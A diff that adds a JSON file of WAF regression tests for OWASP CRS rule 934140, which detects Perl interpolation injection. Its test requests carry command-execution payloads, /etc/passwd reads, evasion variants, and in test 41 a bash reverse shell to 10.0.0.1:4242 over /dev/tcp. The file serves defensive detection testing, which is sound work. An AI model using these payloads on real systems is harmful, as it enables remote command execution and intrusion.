@@ -1,0 +1,1401 @@
+[
+  {
+    "name": "CRS 934140-1: Perl interpolation attack: @{[system 'whoami']}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bsystem%20%27whoami%27%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-2: Perl interpolation attack: @{[getpwuid($>)]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bgetpwuid%28%24%3E%29%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-3: Perl interpolation attack: @{[rand 100]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Brand%20100%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-4: Perl interpolation attack: @{[$$]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5B%24%24%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-5: Perl interpolation attack: @{[keys %ENV]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bkeys%20%25ENV%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-6: Perl interpolation attack: @{[crypt($passwd, 'xx')]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bcrypt%28%24passwd%2C%20%27xx%27%29%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-7: Perl interpolation attack: @{[CORE::time()]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5BCORE%3A%3Atime%28%29%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-8: Perl interpolation attack: @{[uc 'hello']}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Buc%20%27hello%27%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-9: Perl interpolation attack: @{[sort { $a <=> $b } (3,2,1)]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bsort%20%7B%20%24a%20%3C%3D%3E%20%24b%20%7D%20%283%2C2%2C1%29%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-10: Perl interpolation attack: @{   [   uc   'hello'   ]   }",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%20%20%20%5B%20%20%20uc%20%20%20%27hello%27%20%20%20%5D%20%20%20%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-11: Perl interpolation (parens before call): @{[ (system 'id') ]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5B%20%28system%20%27id%27%29%20%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-12: Perl interpolation (ampersand call): @{[ &system 'id' ]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5B%20%26system%20%27id%27%20%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-13: Perl interpolation (double negation unary): @{[ !!system 'id' ]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5B%20%21%21system%20%27id%27%20%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-14: Perl interpolation (CORE namespace): @{[ CORE::system 'id' ]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5B%20CORE%3A%3Asystem%20%27id%27%20%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-15: Perl interpolation (do{} block): @{[ do { system 'id' } ]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5B%20do%20%7B%20system%20%27id%27%20%7D%20%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-16: Perl interpolation (qq{} string arg): @{[ system qq{whoami} ]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5B%20system%20qq%7Bwhoami%7D%20%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-17: Perl interpolation (string concatenation arg): @{[ system ('who'.'ami') ]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5B%20system%20%28%27who%27.%27ami%27%29%20%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-18: Perl interpolation (whitespace & tabs): @{[\tsystem\t'id'\t]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5B%09system%09%27id%27%09%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-19: Perl interpolation (newline before ]): @{[ system 'id' # cmt \\n ]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bsystem%20%27id%27%20%23cmt%0A%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-20: Perl interpolation (ampersand + namespace, no args): @{[ &CORE::time ]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5B%20%26CORE%3A%3Atime%20%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-21: Perl interpolation (extra spaces everywhere): @{    [    system    \"id\"    ]    }",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%20%20%20%20%5B%20%20%20%20system%20%20%20%20%22id%22%20%20%20%20%5D%20%20%20%20%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-22: Perl interpolation attack (double @ valid): @@{[CORE::time()]}",
+    "method": "GET",
+    "uri": "/get?x=%40%40%7B%5BCORE%3A%3Atime%28%29%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-23: Perl interpolation attack (quad @ attempt; likely error but malicious intent): @@@@{[CORE::time()]}",
+    "method": "GET",
+    "uri": "/get?x=%40%40%40%40%7B%5BCORE%3A%3Atime%28%29%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-24: Perl interpolation (evasion: missing closing brace): @{[system 'id']",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bsystem%20%27id%27%5D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-25: Perl interpolation (evasion: missing closing brace with extra text): @{[system 'id']extra",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bsystem%20%27id%27%5Dextra",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-26: Perl interpolation (evasion: multiple bracket pairs): @{[test][test2]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Btest%5D%5Btest2%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-27: Perl interpolation (backslash in command): @{[system 'who\\ami']}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bsystem%20%27who%5Cami%27%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-28: Perl interpolation (empty quotes in command): @{[system 'whoam''''i']}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bsystem%20%27whoam%27%27%27%27i%27%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-29: Perl interpolation in POST body: @{[system 'id']}",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "38"
+      ]
+    ],
+    "body": "param=%40%7B%5Bsystem%20%27id%27%5D%7D",
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-30: Perl interpolation in cookie value: @{[CORE::time()]}",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Cookie",
+        "session=@{[CORE::time()]}"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-31: Perl interpolation in cookie name: @{[system 'id']}",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Cookie",
+        "@{[system 'id']}=value"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-32: Perl interpolation in argument name: @{[getpwuid($>)]}",
+    "method": "GET",
+    "uri": "/get?%40%7B%5Bgetpwuid%28%24%3E%29%5D%7D=value",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-33: Perl interpolation (vertical tab whitespace): @{[\\vsystem\\v'id'\\v]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5B%0Bsystem%0B%27id%27%0B%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-34: Perl interpolation (exec instead of system): @{[exec 'whoami']}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bexec%20%27whoami%27%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-35: Perl interpolation (backticks): @{[`whoami`]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5B%60whoami%60%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-36: Perl interpolation (qx{} command): @{[qx{whoami}]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bqx%7Bwhoami%7D%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-37: Perl interpolation (eval block): @{[eval{system 'id'}]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Beval%7Bsystem%20%27id%27%7D%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-38: Perl interpolation (open pipe): @{[open F,'|ls']}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bopen%20F%2C%27%7Cls%27%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-39: Perl interpolation (require statement): @{[require File::Find]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Brequire%20File%3A%3AFind%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-40: Perl interpolation (long payload): @{[system 'cat /etc/passwd | grep root | cut -d: -f1']}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bsystem%20%27cat%20%2Fetc%2Fpasswd%20%7C%20grep%20root%20%7C%20cut%20-d%3A%20-f1%27%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-41: Perl interpolation (reverse shell): @{[system 'bash -c bash -i >& /dev/tcp/10.0.0.1/4242 0>&1']}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bsystem%20%27bash%20-c%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4242%200%3E%261%27%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-42: Perl interpolation (file read): @{[open F,'/etc/passwd';@a=<F>]}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5Bopen%20F%2C%27%2Fetc%2Fpasswd%27%3B%40a%3D%3CF%3E%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-43: Perl interpolation (mixed case @): @{[System 'ID']}",
+    "method": "GET",
+    "uri": "/get?x=%40%7B%5BSystem%20%27ID%27%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-44: Negative test: JSON array (should not match)",
+    "method": "GET",
+    "uri": "/get?x=%7B%22array%22%3A%5B1%2C2%2C3%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-45: Negative test: CSS attribute selector (should not match)",
+    "method": "GET",
+    "uri": "/get?css=div%5Bdata-value%3D%22test%22%5D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-46: Negative test: Email address with @ (should not match)",
+    "method": "GET",
+    "uri": "/get?email=user%40example.com",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-47: Negative test: Python dict syntax (should not match)",
+    "method": "GET",
+    "uri": "/get?data=%7B%27key%27%3A%5B%27value1%27%2C%27value2%27%5D%7D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-48: Negative test: JavaScript array (should not match)",
+    "method": "GET",
+    "uri": "/get?arr=%5B%22a%22%2C%22b%22%2C%22c%22%5D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-49: Negative test: Markdown link syntax (should not match)",
+    "method": "GET",
+    "uri": "/get?text=%5Blink%5D%28https%3A%2F%2Fexample.com%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-50: Negative test: Hash with array value (should not match)",
+    "method": "GET",
+    "uri": "/get?perl=%24hash%7Bkey%7D%3D%5B1%2C2%2C3%5D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      934140
+    ]
+  },
+  {
+    "name": "CRS 934140-51: GHSA: 934140 payload via XML attribute injection (verifies XML://@* coverage)",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Content-Type",
+        "application/xml"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "80"
+      ]
+    ],
+    "body": "<?xml version=\"1.0\"?><root><a probe=\"@&#x7B;[system 'whoami']&#x7D;\"></a></root>",
+    "expect_ids": [
+      934140
+    ]
+  }
+]
